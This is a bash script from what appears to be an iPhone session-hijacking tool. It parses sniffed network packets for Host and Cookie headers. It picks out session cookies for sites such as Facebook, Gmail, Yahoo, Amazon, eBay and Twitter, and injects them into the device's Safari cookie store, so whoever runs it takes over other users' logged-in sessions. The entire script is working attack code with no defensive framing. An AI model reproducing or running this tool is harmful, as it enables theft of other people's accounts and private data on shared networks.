#!/bin/bash

# displays cookies
# yay, cookies!

file="temp" # packet file - generated by ./derv.sh

cookie_file="/private/var/mobile/Library/Cookies/Cookies.plist"
if [ ! -f $cookie_file ]; then

  savedata="<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
  savedata="${savedata}\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
  savedata="${savedata}\n<plist version=\"1.0\">"
  savedata="${savedata}\n<array>"
  savedata="${savedata}\n</array>"
  savedata="${savedata}\n</plist>"
  echo -e "$savedata" > $cookie_file
  wait
fi

xsaidstuff=false

if [ -f $file ]; then
  cat $file | grep -a "Host: \|Cookie: " | while read line; do
      if [[ `echo "$line" | grep -i "Host: "` != "" ]]; then
        site=$(echo $line | sed 's/Host: //g')
        site=$(echo $site | sed 's/www.//g')
        site=$(echo $site | sed 's/[^a-zA-Z0-9&$@?!.,-:;#%*+=]//g')
        
        # check if this is a site we want the cookie for
        if [[ ! $site == facebook.com ]]     &&
           [[ ! $site == reddit.com ]]       &&
           [[ ! $site == *myspace.com ]]     &&
           [[ ! $site == *yahoo.com ]]       &&
           [[ ! $site == gmail.com ]]        &&
           [[ ! $site == *google.com ]]      &&
           [[ ! $site == *youtube.com ]]     &&
           [[ ! $site == *live.com ]]        &&
           [[ ! $site == *blogger.com ]]     &&
           [[ ! $site == *ebay.com ]]        &&
           [[ ! $site == amazon.com ]]       &&
           [[ ! $site == *overstock.com ]]   &&
           [[ ! $site == twitter.com ]]; then
          # not what we want
          site=""
        fi
      else
        if [ ! $site == "" ]; then
          cookie=$(echo $line | sed 's/Cookie: //g')
          
          # split the cookie by delimiter ;
          arr=$(echo $cookie | tr "; " "\n")
          
          # loop through every element of the cookie
          for x in $arr; do
            cname=${x%%=*}
            cdata=${x##*=}
            
            # cdata=$(echo $cdata | sed 's/[^a-zA-Z0-9&$@?!.,-:;#%*+=]//g')
            cdata=$(echo $cdata | tr -dc '[:print:]')
            # cdata=$(echo $cdata | tr -d "\015")
            
            # temps and temps2 help prevent adding duplicate cookies
            temps="<string>"$cdata"</string>"
            temps2="<string>"$cname"</string>"
            
            cookdata=$(cat $cookie_file)
            if [[ `echo $cookdata | grep -B 4 "\$temps" | grep "\$temps2"` == "" ]]; then
              echo Cookie found and injected. \(${site}\)
              xsaidstuff=true
              
              # remove trailing array and plist tags
              cookdata=$(echo -e "${cookdata}" | grep -v "</array>\|</plist>")
              cookdata="${cookdata}\n\t<dict>"
              
              # created time -- use GNU time! ..or something :X
              cookdata="${cookdata}\n\t\t<key>Created</key>"
              cookdata="${cookdata}\n\t\t<real>"$(date +%s.%N)"</real>"
              
              # domain -- has leading period for some reason
              cookdata="${cookdata}\n\t\t<key>Domain</key>"
              cookdata="${cookdata}\n\t\t<string>."$site"</string>"
              
              # date -- Need to change to 2011 next month, derp!
              cookdata="${cookdata}\n\t\t<key>Expires</key>"
              cookdata="${cookdata}\n\t\t<date>2010-"$(date +%m-%d)"T"$(date +%k:%M:%S)"Z</date>"
              
              # cookie value name
              cookdata="${cookdata}\n\t\t<key>Name</key>"
              cookdata="${cookdata}\n\t\t<string>"${cname}"</string>"
              
              # path (always '\' as far as i can tell!)
              cookdata="${cookdata}\n\t\t<key>Path</key>"
              cookdata="${cookdata}\n\t\t<string>/</string>"
              
              # cookie value
              cookdata="${cookdata}\n\t\t<key>Value</key>"
              cookdata="${cookdata}\n\t\t<string>"${cdata}"</string>"
              
              # close the xml pattern
              cookdata="${cookdata}\n\t</dict>"
              cookdata="${cookdata}\n</array>"
              cookdata="${cookdata}\n</plist>"
              
              # write new cookie data to cookie file
              echo -e "$cookdata" > $cookie_file
            fi
          done # end of loop through every cookie value
          
        fi # end of if ! site=""
        
      fi # end of site-or-cookie check
    
  done # end of loop-through-every-name
  
  # if we previous output anything, let them know we're stopping for now
  if [ $xsaidstuff == true ]; then
    echo Waiting for more packets...
  fi

fi

exit 0